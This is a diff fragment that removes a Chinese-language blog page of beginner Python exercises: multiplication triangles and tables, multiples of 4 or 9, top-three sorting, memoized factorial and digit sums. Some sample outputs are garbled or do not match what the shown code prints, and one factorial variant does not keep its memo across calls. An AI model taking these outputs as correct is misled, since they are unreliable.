-<li><strong>輸出說明</strong>：以三角形的格式，依序輸出數字的倍乘結果，並在行首及之後位置使用半形空格來對齊。</li>
-</ol>
-<h3 id="解題思路"><a href="#解題思路" class="headerlink" title="解題思路"></a>解題思路</h3><ol>
-<li>建立一個巢狀迴圈，外層迴圈控制行數，內層迴圈計算該行的乘積值並輸出。</li>
-<li>在每一行中，輸出該行號乘以 1 到行號的每個數字。</li>
-<li>為了保持對齊，需要在每一行前加上適量的空白，以達到題目要求的三角形效果。</li>
-</ol>
-<h3 id="範例輸出分析"><a href="#範例輸出分析" class="headerlink" title="範例輸出分析"></a>範例輸出分析</h3><p>從範例中可以看出：</p>
-<ul>
-<li>每行的開始處會有一定數量的空白，空白數量依行數增加。</li>
-<li>每一行的數字依序呈現乘積，並在每個乘積之間加上空格。</li>
-</ul>
-<p>例如，當輸入 <code>5</code> 時，輸出如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">        1</span><br><span class="line">      2   4</span><br><span class="line">    3   6   9</span><br><span class="line">  4   8  12  16</span><br><span class="line">5  10  15  20  25</span><br></pre></td></tr></table></figure>
-
-<h3 id="程式碼實作"><a href="#程式碼實作" class="headerlink" title="程式碼實作"></a>程式碼實作</h3><p>以下是 Python 程式碼，依據上述邏輯來實現所需的三角形輸出格式。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">triangular_multiples</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 輸出每行的前導空格，使其呈現三角形排列</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  &quot;</span> * (n - i), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 輸出該行的乘積數字</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i + <span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i * j:<span class="number">2</span>&#125;</span>&quot;</span>, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 換行</span></span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 測試範例</span></span><br><span class="line">triangular_multiples(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>()  <span class="comment"># 分隔行</span></span><br><span class="line">triangular_multiples(<span class="number">12</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="程式碼解釋"><a href="#程式碼解釋" class="headerlink" title="程式碼解釋"></a>程式碼解釋</h3><ul>
-<li><code>for i in range(1, n + 1)</code>：外層迴圈控制行數，從第 1 行到第 n 行。</li>
-<li><code>print(&quot;  &quot; * (n - i), end=&quot;&quot;)</code>：先印出空格，空格數量依行數遞減，以形成三角形格式。</li>
-<li><code>for j in range(1, i + 1)</code>：內層迴圈控制每行內的數字，計算 <code>i * j</code> 的乘積，並格式化輸出（<code>&#123;i * j:2&#125;</code> 確保兩位數對齊）。</li>
-<li><code>print()</code>：內層迴圈結束後換行，開始新的一行。</li>
-</ul>
-<h3 id="測試結果"><a href="#測試結果" class="headerlink" title="測試結果"></a>測試結果</h3><p>當 <code>n = 5</code> 時，輸出如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">        1</span><br><span class="line">      2   4</span><br><span class="line">    3   6   9</span><br><span class="line">  4   8  12  16</span><br><span class="line">5  10  15  20  25</span><br></pre></td></tr></table></figure>
-
-<p>當 <code>n = 12</code> 時，輸出如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                     1</span><br><span class="line">                   2   4</span><br><span class="line">                 3   6   9</span><br><span class="line">               4   8  12  16</span><br><span class="line">             5  10  15  20  25</span><br><span class="line">           6  12  18  24  30  36</span><br><span class="line">         7  14  21  28  35  42  49</span><br><span class="line">       8  16  24  32  40  48  56  64</span><br><span class="line">     9  18  27  36  45  54  63  72  81</span><br><span class="line">   10  20  30  40  50  60  70  80  90 100</span><br><span class="line"> 11  22  33  44  55  66  77  88  99 110 121</span><br><span class="line">12  24  36  48  60  72  84  96 108 120 132 144</span><br></pre></td></tr></table></figure>
-
-<h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><p>這樣的輸出符合題目的格式，使用巢狀迴圈控制輸出，每行以一定的空格間隔，使得乘積值呈現三角形</p>
-<hr>
-<p>設計說明：</p>
-<p>(I) 請撰寫一程式，讓使用者輸入兩個正整數a、b（a&lt;&#x3D;b），輸出從a到b（包含a和b）之間4或9的倍數（一列輸出十個數字、欄寬為4、靠左對齊）以及倍數之個數、總和。</p>
-<p>輸入輸出：</p>
-<p>輸入說明</p>
-<p>兩個正整數a、b（a&lt;&#x3D;b）</p>
-<p>輸出說明</p>
-<p>格式化輸出兩個正整數之間4或9之倍數（包含a和b）</p>
-<p>倍數個數</p>
-<p>倍數總合</p>
-<p>(3)範例輸入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br><span class="line">55</span><br></pre></td></tr></table></figure>
-
-<p>範例輸出(·為半形空格)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8...9...12..16..18...20·2427.…28..32·</span><br><span class="line">36..40.…44..45.…48..52..54.</span><br><span class="line">17</span><br><span class="line">513</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>程式寫法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">a = eval(input())</span><br><span class="line">b = eval(input())</span><br><span class="line">count = 0</span><br><span class="line">tot = 0</span><br><span class="line">for i in range(a,b+1):</span><br><span class="line">    if i%4 == 0 or i%9 == 0:</span><br><span class="line">        count += 1</span><br><span class="line">        tot += i</span><br><span class="line">        print(&quot;&#123;:&lt;4&#125;&quot;.format(i),end=&quot;&quot;)</span><br><span class="line">        if count%10 == 0:</span><br><span class="line">            print()</span><br><span class="line">print(&quot;\n&#123;&#125;&quot;.format(count))</span><br><span class="line">print(tot)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>另一種寫法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = int( input() )</span><br><span class="line">b = int( input() )</span><br><span class="line">all = 0</span><br><span class="line">count = 0</span><br><span class="line">for i in range( a, b + 1 ):</span><br><span class="line">    if i % 4 == 0 or i % 9 == 0:</span><br><span class="line">        count += 1</span><br><span class="line">        print(&quot;&#123;:&lt;4d&#125;&quot;.format(i), end=&quot;&quot;)</span><br><span class="line">        if count % 10 == 0:</span><br><span class="line">            print()</span><br><span class="line">        all += i</span><br><span class="line">print()</span><br><span class="line">print(count)</span><br><span class="line">print(all)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<hr>
-<p>設計說明：</p>
-<p>請撰寫一程式，要求使用者輸入十個數字並存放在串列中。接著由大到小的順序顯示最大的3個數字</p>
-<p>輸入輸出：</p>
-<p>輸入說明</p>
-<p>十個數字</p>
-<p>輸出說明</p>
-<p>由大到小排序，顯示最大的3個數字</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">40</span><br><span class="line">32</span><br><span class="line">1</span><br><span class="line">29</span><br><span class="line">2</span><br><span class="line">1</span><br><span class="line">48</span><br><span class="line">57</span><br><span class="line">44</span><br></pre></td></tr></table></figure>
-
-<p>範例輸出(·為半形空格)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">57 48 44</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>程式寫法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">a = []</span><br><span class="line">for i in range(10):</span><br><span class="line">    a.append(eval(input()))</span><br><span class="line">b = sorted(a)</span><br><span class="line"></span><br><span class="line">print(b[-1],b[-2],b[-3])</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>另一種寫法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = []</span><br><span class="line">for i in range(10):</span><br><span class="line">    a.append(eval(input()))</span><br><span class="line">    b = sorted(a)</span><br><span class="line">print(b[-1],end=&quot; &quot;)</span><br><span class="line">print(b[-2],end=&quot; &quot;)</span><br><span class="line">print(b[-3],end=&quot;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>題目：計算階乘並記錄已計算結果</p>
-<p>請撰寫一個函數 factorial_memo(n)，它能計算數字 n 的階乘（n! &#x3D; n × (n-1) × … × 1），同時使用 dictionary 來記錄和儲存已經計算過的階乘結果。當計算新的階乘時，如果已經計算過該值，應直接從 dictionary 中獲取，而不是重新計算。</p>
-<p>函數要求：</p>
-<ul>
-<li>使用遞迴方式計算階乘。</li>
-<li>使用一個 dictionary 來儲存所有已計算過的階乘結果，稱為 memo，以避免重複計算。</li>
-<li>函數應該可以處理多次的階乘請求並儲存歷史計算結果。</li>
-</ul>
-<p>範例：</p>
-<p>factorial_memo(5)</p>
-<ul>
-<li>輸出應為：120</li>
-<li>內部的 memo 應儲存 {1: 1, 2: 2, 3: 6, 4: 24, 5: 120}</li>
-</ul>
-<p>factorial_memo(6)</p>
-<ul>
-<li>輸出應為：720</li>
-<li>內部的 memo 應儲存 {1: 1, 2: 2, 3: 6, 4: 24, 5: 120, 6: 720}</li>
-</ul>
-<p>提示：</p>
-<ol>
-<li>使用遞迴來計算階乘。</li>
-<li>每當你計算一個新階乘時，將結果存入 memo。</li>
-<li>如果查詢的階乘已經在 memo 中，則直接返回該值。</li>
-</ol>
-<p>程式寫法</p>
-<p>這裡有幾種不同寫法，透過不同的技巧來實現 <code>factorial_memo</code> 函數，但都達到相同的目標：</p>
-<p>使用遞迴計算階乘並記錄已計算的結果。</p>
-<h3 id="寫法-1：使用內建函數-lru-cache-進行快取"><a href="#寫法-1：使用內建函數-lru-cache-進行快取" class="headerlink" title="寫法 1：使用內建函數 lru_cache 進行快取"></a>寫法 1：使用內建函數 <code>lru_cache</code> 進行快取</h3><p>Python 提供了 <code>functools.lru_cache</code>，這是一種自動化的快取裝飾器，能幫助我們避免重複計算。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> lru_cache</span><br><span class="line"></span><br><span class="line"><span class="meta">@lru_cache(<span class="params">maxsize=<span class="literal">None</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorial_memo</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n * factorial_memo(n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 測試範例</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo(<span class="number">5</span>))  <span class="comment"># 輸出：120</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo(<span class="number">6</span>))  <span class="comment"># 輸出：720</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="寫法-2：在函數內部使用-memo-字典"><a href="#寫法-2：在函數內部使用-memo-字典" class="headerlink" title="寫法 2：在函數內部使用 memo 字典"></a>寫法 2：在函數內部使用 <code>memo</code> 字典</h3><p>在這個寫法中，我們使用函數內部變數 <code>memo</code>，而不設為預設參數。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">factorial_memo</span>(<span class="params">n</span>):</span><br><span class="line">    memo = &#123;<span class="number">1</span>: <span class="number">1</span>&#125;  <span class="comment"># 初始化 memo 字典</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">helper</span>(<span class="params">x</span>):</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> memo:</span><br><span class="line">            <span class="keyword">return</span> memo[x]</span><br><span class="line">        memo[x] = x * helper(x - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> memo[x]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> helper(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 測試範例</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo(<span class="number">5</span>))  <span class="comment"># 輸出：120</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo(<span class="number">6</span>))  <span class="comment"># 輸出：720</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="寫法-3：使用類別來管理-memo"><a href="#寫法-3：使用類別來管理-memo" class="headerlink" title="寫法 3：使用類別來管理 memo"></a>寫法 3：使用類別來管理 <code>memo</code></h3><p>透過類別來管理 <code>memo</code> 字典，這樣可以讓多個函數調用時共用相同的 <code>memo</code>，而且更容易追蹤儲存的階乘結果。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FactorialCalculator</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.memo = &#123;<span class="number">1</span>: <span class="number">1</span>&#125;  <span class="comment"># 初始化 memo 字典</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">factorial_memo</span>(<span class="params">self, n</span>):</span><br><span class="line">        <span class="keyword">if</span> n <span class="keyword">in</span> <span class="variable language_">self</span>.memo:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.memo[n]</span><br><span class="line">        <span class="variable language_">self</span>.memo[n] = n * <span class="variable language_">self</span>.factorial_memo(n - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.memo[n]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 測試範例</span></span><br><span class="line">calculator = FactorialCalculator()</span><br><span class="line"><span class="built_in">print</span>(calculator.factorial_memo(<span class="number">5</span>))  <span class="comment"># 輸出：120</span></span><br><span class="line"><span class="built_in">print</span>(calculator.factorial_memo(<span class="number">6</span>))  <span class="comment"># 輸出：720</span></span><br><span class="line"><span class="built_in">print</span>(calculator.memo)               <span class="comment"># 輸出：&#123;1: 1, 2: 2, 3: 6, 4: 24, 5: 120, 6: 720&#125;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="寫法-4：使用非遞迴的方式（自底向上）"><a href="#寫法-4：使用非遞迴的方式（自底向上）" class="headerlink" title="寫法 4：使用非遞迴的方式（自底向上）"></a>寫法 4：使用非遞迴的方式（自底向上）</h3><p>透過迴圈進行計算，並儲存每一步的結果。這種方法不使用遞迴，但仍能達到儲存計算結果的效果。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">factorial_memo</span>(<span class="params">n</span>):</span><br><span class="line">    memo = &#123;<span class="number">1</span>: <span class="number">1</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n + <span class="number">1</span>):</span><br><span class="line">        memo[i] = i * memo[i - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> memo[n]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 測試範例</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo(<span class="number">5</span>))  <span class="comment"># 輸出：120</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo(<span class="number">6</span>))  <span class="comment"># 輸出：720</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="寫法-5：使用全域變數儲存-memo"><a href="#寫法-5：使用全域變數儲存-memo" class="headerlink" title="寫法 5：使用全域變數儲存 memo"></a>寫法 5：使用全域變數儲存 <code>memo</code></h3><p>使用全域變數 <code>memo</code> 來儲存計算過的結果，但這種方式不建議在大型專案中使用，因為全域變數會增加維護的複雜性。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">memo = &#123;<span class="number">1</span>: <span class="number">1</span>&#125;  <span class="comment"># 定義全域變數 memo</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorial_memo</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> memo:</span><br><span class="line">        <span class="keyword">return</span> memo[n]</span><br><span class="line">    memo[n] = n * factorial_memo(n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> memo[n]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 測試範例</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo(<span class="number">5</span>))  <span class="comment"># 輸出：120</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo(<span class="number">6</span>))  <span class="comment"># 輸出：720</span></span><br><span class="line"><span class="built_in">print</span>(memo)               <span class="comment"># 輸出：&#123;1: 1, 2: 2, 3: 6, 4: 24, 5: 120, 6: 720&#125;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="寫法-6：使用靜態變數儲存-memo（函數內部維護狀態）"><a href="#寫法-6：使用靜態變數儲存-memo（函數內部維護狀態）" class="headerlink" title="寫法 6：使用靜態變數儲存 memo（函數內部維護狀態）"></a>寫法 6：使用靜態變數儲存 <code>memo</code>（函數內部維護狀態）</h3><p>將 <code>memo</code> 作為函數內部的靜態變數，以便在每次函數呼叫時維持狀態。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">factorial_memo</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="comment"># 將 memo 附加在函數上作為靜態變數</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(factorial_memo, <span class="string">&quot;memo&quot;</span>):</span><br><span class="line">        factorial_memo.memo = &#123;<span class="number">1</span>: <span class="number">1</span>&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> factorial_memo.memo:</span><br><span class="line">        <span class="keyword">return</span> factorial_memo.memo[n]</span><br><span class="line">    </span><br><span class="line">    factorial_memo.memo[n] = n * factorial_memo(n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> factorial_memo.memo[n]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 測試範例</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo(<span class="number">5</span>))  <span class="comment"># 輸出：120</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo(<span class="number">6</span>))  <span class="comment"># 輸出：720</span></span><br><span class="line"><span class="built_in">print</span>(factorial_memo.memo) <span class="comment"># 輸出：&#123;1: 1, 2: 2, 3: 6, 4: 24, 5: 120, 6: 720&#125;</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<p>設計說明：<br>(1) 請使用迴圈敘述撰寫一程式，要求使用者輸入一個正整數n（n&lt;10），顯示n*n乘法表。</p>
-<p>(2) 每項運算式需進行格式化排列整齊，每個運算子及運算元輸出的欄寬為2，而每項乘積輸出的欄寬為4，皆靠左對齊不跳行。</p>
-<h3 id="程式碼分解"><a href="#程式碼分解" class="headerlink" title="程式碼分解"></a>程式碼分解</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="built_in">eval</span>(<span class="built_in">input</span>())  <span class="comment"># 讓使用者輸入一個數字</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):  <span class="comment"># 外層迴圈控制行數，從 1 到 n</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):  <span class="comment"># 內層迴圈控制每一行的列數，從 1 到 n</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; * &#123;&#125; = &#123;:&lt;4&#125;&#x27;</span>.<span class="built_in">format</span>(j, i, (i * j)), end=<span class="string">&#x27;&#x27;</span>)  <span class="comment"># 輸出每一行的乘法結果</span></span><br><span class="line">    <span class="built_in">print</span>()  <span class="comment"># 每行輸出完畢後換行</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="運作原理"><a href="#運作原理" class="headerlink" title="運作原理"></a>運作原理</h3><p>這段程式碼中有兩個 <code>for</code> 迴圈：</p>
-<ol>
-<li>**外層 <code>for i in range(1, n + 1)</code>**：控制「行數」。</li>
-<li>**內層 <code>for j in range(1, n + 1)</code>**：控制每一行的「列數」。</li>
-</ol>
-<p>讓我們逐步解釋程式如何運作，假設使用者輸入 <code>n = 3</code>。</p>
-<h4 id="步驟分析"><a href="#步驟分析" class="headerlink" title="步驟分析"></a>步驟分析</h4><ol>
-<li>使用者輸入 <code>n = 3</code>。</li>
-<li>程式進入<strong>外層迴圈</strong>，<code>i</code> 會從 <code>1</code> 開始，依次取值 <code>1, 2, 3</code>。<ul>
-<li>當 <code>i = 1</code> 時，程式會執行內層迴圈。</li>
-<li>當 <code>i = 2</code> 時，再次執行內層迴圈。</li>
-<li>當 <code>i = 3</code> 時，最後一次執行內層迴圈。</li>
-</ul>
-</li>
-<li><strong>內層迴圈</strong> <code>for j in range(1, n + 1)</code>：<ul>
-<li>對於每個 <code>i</code> 的值，<code>j</code> 從 <code>1</code> 到 <code>3</code>，依次執行程式。</li>
-<li>每次內層迴圈執行時，都會計算 <code>i * j</code>，並顯示乘法表格的一部分。</li>
-</ul>
-</li>
-</ol>
-<h4 id="更詳細的運作流程"><a href="#更詳細的運作流程" class="headerlink" title="更詳細的運作流程"></a>更詳細的運作流程</h4><p>當 <code>n = 3</code> 時，執行的過程如下：</p>
-<ol>
-<li><p><strong>當 <code>i = 1</code> 時</strong>：</p>
-<ul>
-<li>進入內層迴圈，<code>j</code> 從 <code>1</code> 到 <code>3</code>。<ul>
-<li>當 <code>j = 1</code>：計算 <code>1 * 1 = 1</code>，輸出 <code>1 * 1 = 1   </code>。</li>
-<li>當 <code>j = 2</code>：計算 <code>2 * 1 = 2</code>，輸出 <code>2 * 1 = 2   </code>。</li>
-<li>當 <code>j = 3</code>：計算 <code>3 * 1 = 3</code>，輸出 <code>3 * 1 = 3   </code>。</li>
-</ul>
-</li>
-<li>內層迴圈完成，輸出換行 <code>print()</code>，結束第一行。</li>
-<li>第一行輸出結果：<code>1 * 1 = 1   2 * 1 = 2   3 * 1 = 3   </code>。</li>
-</ul>
-</li>
-<li><p><strong>當 <code>i = 2</code> 時</strong>：</p>
-<ul>
-<li>進入內層迴圈，<code>j</code> 從 <code>1</code> 到 <code>3</code>。<ul>
-<li>當 <code>j = 1</code>：計算 <code>1 * 2 = 2</code>，輸出 <code>1 * 2 = 2   </code>。</li>
-<li>當 <code>j = 2</code>：計算 <code>2 * 2 = 4</code>，輸出 <code>2 * 2 = 4   </code>。</li>
-<li>當 <code>j = 3</code>：計算 <code>3 * 2 = 6</code>，輸出 <code>3 * 2 = 6   </code>。</li>
-</ul>
-</li>
-<li>內層迴圈完成，輸出換行 <code>print()</code>，結束第二行。</li>
-<li>第二行輸出結果：<code>1 * 2 = 2   2 * 2 = 4   3 * 2 = 6   </code>。</li>
-</ul>
-</li>
-<li><p><strong>當 <code>i = 3</code> 時</strong>：</p>
-<ul>
-<li>進入內層迴圈，<code>j</code> 從 <code>1</code> 到 <code>3</code>。<ul>
-<li>當 <code>j = 1</code>：計算 <code>1 * 3 = 3</code>，輸出 <code>1 * 3 = 3   </code>。</li>
-<li>當 <code>j = 2</code>：計算 <code>2 * 3 = 6</code>，輸出 <code>2 * 3 = 6   </code>。</li>
-<li>當 <code>j = 3</code>：計算 <code>3 * 3 = 9</code>，輸出 <code>3 * 3 = 9   </code>。</li>
-</ul>
-</li>
-<li>內層迴圈完成，輸出換行 <code>print()</code>，結束第三行。</li>
-<li>第三行輸出結果：<code>1 * 3 = 3   2 * 3 = 6   3 * 3 = 9   </code>。</li>
-</ul>
-</li>
-</ol>
-<p>最終輸出會是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 * 1 = 1   2 * 1 = 2   3 * 1 = 3   </span><br><span class="line">1 * 2 = 2   2 * 2 = 4   3 * 2 = 6   </span><br><span class="line">1 * 3 = 3   2 * 3 = 6   3 * 3 = 9   </span><br></pre></td></tr></table></figure>
-
-<h3 id="解釋-format-j-i-i-j-的部分"><a href="#解釋-format-j-i-i-j-的部分" class="headerlink" title="解釋 format(j, i, (i * j)) 的部分"></a>解釋 <code>format(j, i, (i * j))</code> 的部分</h3><p>在 <code>print(&#39;&#123;&#125; * &#123;&#125; = &#123;:&lt;4&#125;&#39;.format(j, i, (i * j)), end=&#39;&#39;)</code>：</p>
-<ul>
-<li><code>j</code> 和 <code>i</code> 表示當前要計算的乘法因子。</li>
-<li><code>(i * j)</code> 是計算的結果。</li>
-<li><code>&#39;&#123;:&lt;4&#125;&#39;</code> 格式化輸出會讓結果左對齊，占 <code>4</code> 個空間，讓輸出看起來整齊。</li>
-<li><code>end=&#39;&#39;</code> 是為了避免 <code>print()</code> 預設的換行，這樣每次輸出會排在同一行，直到內層迴圈結束後再換行。</li>
-</ul>
-<h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>雙 <code>for</code> 迴圈讓程式可以按照「行」與「列」的結構，輸出一個 <code>n x n</code> 的乘法表。</p>
-<hr>
-<p>設計說明：<br>請使用迴圈敘述撰寫一程式，要求使用者輸入一個數字，此數字代表後面測試資料的數量。每一筆測試資料是一個正整數（由使用者輸入），將此正整數的每位數全部加總起來。</p>
-<p>範例輸入輸出</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">98765</span><br><span class="line">Sum of al digits of 98765 is 35</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>這是一種<strong>列表生成式</strong>的寫法，主要用於將每個位數轉換成一個整數並求和。我們逐步來看這段程式碼是如何運作的。</p>
-<h3 id="程式碼分解-1"><a href="#程式碼分解-1" class="headerlink" title="程式碼分解"></a>程式碼分解</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">input</span>())):</span><br><span class="line">    n = <span class="built_in">str</span>(<span class="built_in">input</span>())  <span class="comment"># 將使用者輸入的測試資料轉為字串，以便逐位處理</span></span><br><span class="line">    a = [<span class="built_in">int</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">str</span>(n))]  <span class="comment"># 將 n 的每一位轉換成整數並存入列表 a</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sum of all digits of &quot;</span> + <span class="built_in">str</span>(n) + <span class="string">&quot; is &quot;</span> + <span class="built_in">str</span>(<span class="built_in">sum</span>(a)))  <span class="comment"># 計算並輸出 a 中所有位數的總和</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="詳細解釋"><a href="#詳細解釋" class="headerlink" title="詳細解釋"></a>詳細解釋</h3><ol>
-<li><p><strong>外層 <code>for</code> 迴圈</strong>：<code>for i in range(int(input())):</code></p>
-<ul>
-<li><code>int(input())</code> 會先讓使用者輸入一個數字，表示有幾筆測試資料。</li>
-<li>這個 <code>for</code> 迴圈會依次處理每一筆測試資料。</li>
-</ul>
-</li>
-<li><p><strong>輸入測試資料並轉成字串</strong>：<code>n = str(input())</code></p>
-<ul>
-<li>讓使用者輸入一個正整數 <code>n</code>，然後將 <code>n</code> 轉成字串型別。將 <code>n</code> 轉成字串的原因是為了方便逐位處理，例如 <code>123</code> 可以轉為字串 <code>&quot;123&quot;</code>，這樣每一位可以被當成一個字符來處理。</li>
-</ul>
-</li>
-<li><p><strong>列表生成式</strong>：<code>a = [int(j) for j in list(str(n))]</code></p>
-<ul>
-<li>這是整段程式中較難理解的部分。</li>
-<li><strong>逐步解釋這段代碼</strong>：<ul>
-<li><code>str(n)</code>：將 <code>n</code> 轉為字串形式（如果它還不是字串）。</li>
-<li><code>list(str(n))</code>：將字串 <code>&quot;123&quot;</code> 轉為列表 <code>[&#39;1&#39;, &#39;2&#39;, &#39;3&#39;]</code>，每個字符都是一個單獨的字元。</li>
-<li><code>[int(j) for j in list(str(n))]</code>：這是一種列表生成式語法，逐一取出字元 <code>j</code> 並將它轉為整數 <code>int(j)</code>，然後存入新的列表 <code>a</code> 中。</li>
-<li>最終，<code>a</code> 會變成一個整數列表，比如對於 <code>&quot;123&quot;</code>，<code>a</code> 會是 <code>[1, 2, 3]</code>。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p><strong>計算位數總和並輸出</strong>：<code>print(&quot;Sum of all digits of &quot; + str(n) + &quot; is &quot; + str(sum(a)))</code></p>
-<ul>
-<li><code>sum(a)</code>：計算列表 <code>a</code> 中所有元素的總和。例如，<code>a = [1, 2, 3]</code>，則 <code>sum(a)</code> 為 <code>1 + 2 + 3 = 6</code>。</li>
-<li><code>print(&quot;Sum of all digits of &quot; + str(n) + &quot; is &quot; + str(sum(a)))</code>：將結果格式化為字符串並輸出，例如 <code>Sum of all digits of 123 is 6</code>。</li>
-</ul>
-</li>
-</ol>
-<h3 id="範例運作流程"><a href="#範例運作流程" class="headerlink" title="範例運作流程"></a>範例運作流程</h3><p>假設輸入的測試數量為 <code>2</code>，接著輸入的兩筆測試資料分別為 <code>123</code> 和 <code>456</code>：</p>
-<ol>
-<li>輸入 <code>2</code>，表示要輸入兩筆測試資料。</li>
-<li><strong>第一筆測試資料</strong>：<ul>
-<li><code>n = 123</code></li>
